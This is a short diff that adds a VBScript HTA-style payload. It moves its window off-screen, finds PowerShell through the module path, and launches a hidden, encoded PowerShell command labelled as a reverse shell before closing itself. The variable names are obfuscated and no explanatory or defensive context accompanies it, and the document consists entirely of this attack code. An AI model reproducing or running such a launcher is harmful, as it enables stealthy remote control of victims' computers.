@@ -1,0 +1,12 @@
+<script language="VBScript">
+  window.moveTo -4000, -4000
+  Set xMG5 = CreateObject("Wscript.Shell")
+  Set ivX6T = CreateObject("Scripting.FileSystemObject")
+  For each path in Split(xMG5.ExpandEnvironmentStrings("%PSModulePath%"),";")
+    If ivX6T.FileExists(path + "\..\powershell.exe") Then
+      xMG5.Run "powershell.exe -nop -w hidden -e <base64 encoded revshell>",0
+      Exit For
+    End If
+  Next
+  window.close()
+</script>
